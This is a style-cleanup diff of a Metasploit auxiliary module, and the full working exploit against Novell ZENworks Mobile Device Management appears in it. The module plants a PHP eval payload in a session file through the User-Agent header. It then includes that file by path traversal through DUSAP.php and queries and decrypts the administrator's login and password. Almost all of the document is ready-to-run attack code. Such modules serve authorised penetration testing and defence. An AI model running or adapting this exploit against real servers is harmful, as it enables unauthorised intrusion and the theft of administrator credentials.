@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -14,14 +14,14 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name' => 'Novell Zenworks Mobile Device Managment Admin Credentials',
-      'Description' => %q{
+      'Description' => %q(
         This module attempts to pull the administrator credentials from
         a vulnerable Novell Zenworks MDM server.
-      },
+      ),
       'Author' =>
         [
           'steponequit',
-          'Andrea Micalizzi (aka rgod)' #zdireport
+          'Andrea Micalizzi (aka rgod)' # zdireport
         ],
       'References' =>
         [
@@ -33,40 +33,36 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
-      OptString.new('TARGETURI', [true, 'Path to the Novell Zenworks MDM install', '/'])
-    ], self.class)
+                       OptString.new('TARGETURI', [true, 'Path to the Novell Zenworks MDM install', '/'])
+                     ], self.class)
 
     register_advanced_options([
-      OptBool.new('SSL', [true, "Negotiate SSL connection", false])
-    ], self.class)
+                                OptBool.new('SSL', [true, "Negotiate SSL connection", false])
+                              ], self.class)
   end
 
-  def setup_session()
+  def setup_session
     sess = Rex::Text.rand_text_alpha(8)
     cmd = Rex::Text.rand_text_alpha(8)
-    res = send_request_cgi({
-      'agent' => "<?php echo(eval($_GET['#{cmd}'])); ?>",
-      'method' => "HEAD",
-      'uri' => normalize_uri("#{target_uri.path}", "download.php"),
-      'headers' => {"Cookie" => "PHPSESSID=#{sess}"},
-    })
-    return sess,cmd
+    res = send_request_cgi('agent' => "<?php echo(eval($_GET['#{cmd}'])); ?>",
+                           'method' => "HEAD",
+                           'uri' => normalize_uri(target_uri.path.to_s, "download.php"),
+                           'headers' => { "Cookie" => "PHPSESSID=#{sess}" })
+    [sess, cmd]
   end
 
-  def get_creds(session_id,cmd_var)
-    cmd  = '$pass=mdm_ExecuteSQLQuery('
+  def get_creds(session_id, cmd_var)
+    cmd = '$pass=mdm_ExecuteSQLQuery('
     cmd << '"SELECT UserName,Password FROM Administrators where AdministratorSAKey = 1"'
     cmd << ',array(),false,-1,"","","",QUERY_TYPE_SELECT);'
     cmd << 'echo "".$pass[0]["UserName"].":".mdm_DecryptData($pass[0]["Password"])."";'
 
-    res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri("#{target_uri.path}", "DUSAP.php"),
-      'vars_get' => {
-        'language' => "res/languages/../../../../php/temp/sess_#{session_id}",
-        cmd_var => cmd
-      }
-    })
+    res = send_request_cgi('method' => 'GET',
+                           'uri' => normalize_uri(target_uri.path.to_s, "DUSAP.php"),
+                           'vars_get' => {
+                             'language' => "res/languages/../../../../php/temp/sess_#{session_id}",
+                             cmd_var => cmd
+                           })
 
     if res.nil?
       print_error("Connection timed out")
@@ -74,7 +70,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     creds = res.body.to_s.match(/.*:"(.*)";.*";/)[1]
-    return creds.split(":")
+    creds.split(":")
   end
 
   def report_cred(opts)
@@ -108,18 +104,16 @@ class MetasploitModule < Msf::Auxiliary
     uri = normalize_uri(target_uri.path)
 
     begin
-      res = send_request_raw({
-        'method' => 'GET',
-        'uri' => uri
-      })
+      res = send_request_raw('method' => 'GET',
+                             'uri' => uri)
 
-      if (res and res.code == 200 and res.body.to_s.match(/ZENworks Mobile Management User Self-Administration Portal/) != nil)
+      if res && (res.code == 200) && (res.body.to_s.match(/ZENworks Mobile Management User Self-Administration Portal/) != nil)
         print_status("Found Zenworks MDM, Checking application version")
         ver = res.body.to_s.match(/<p id="version">Version (.*)<\/p>/)[1]
         print_status("Found Version #{ver}")
-        session_id,cmd = setup_session()
-        user,pass = get_creds(session_id,cmd)
-        return if user.empty? and pass.empty?
+        session_id, cmd = setup_session
+        user, pass = get_creds(session_id, cmd)
+        return if user.empty? && pass.empty?
         print_good("Got creds. Login:#{user} Password:#{pass}")
         print_good("Access the admin interface here: #{ip}:#{rport}#{target_uri.path}dashboard/")
 
@@ -132,8 +126,7 @@ class MetasploitModule < Msf::Auxiliary
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
     rescue ::Timeout::Error, ::Errno::EPIPE
     rescue ::OpenSSL::SSL::SSLError => e
-      return if(e.to_s.match(/^SSL_connect /) ) # strange errors / exception if SSL connection aborted
+      return if e.to_s =~ /^SSL_connect / # strange errors / exception if SSL connection aborted
     end
   end
-
 end
